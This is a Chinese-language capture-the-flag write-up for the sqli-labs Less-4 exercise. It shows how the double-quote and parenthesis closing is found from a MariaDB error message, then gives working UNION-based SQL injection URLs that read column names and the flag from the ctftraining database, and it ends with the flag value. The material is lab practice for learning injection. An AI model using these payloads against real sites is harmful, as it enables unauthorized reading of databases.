题目：sqli-labs less4

首先测试出题目为字符型注入。由题目名字可知这次注入跟双引号有关。在url后加入`?id=0"`，访问后，得到的输出如下
```
Welcome    Dhakkan
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '"0"") LIMIT 0,1' at line 1
```
由此可知闭合方式为`")`,在url后加入`?id=0") union select 1,2,3 --+`，访问后，得到的输出如下
```
Welcome    Dhakkan
Your Login name:2
Your Password:3
```
接下来进行正常的Union注入即可得到`flag`，这里在url后加入`?id=0") union select 1,(SELECT Group_concat(column_name) FROM information_schema.columns where table_schema='ctftraining' and table_name='flag'),(SELECT Group_concat(flag) FROM ctftraining.flag) --+`,访问后，得到的输出如下
```
Welcome    Dhakkan
Your Login name:flag
Your Password:flag{7981588c-6f80-44d7-a499-d1db3d5ebecf}
```
`flag`:`flag{7981588c-6f80-44d7-a499-d1db3d5ebecf}`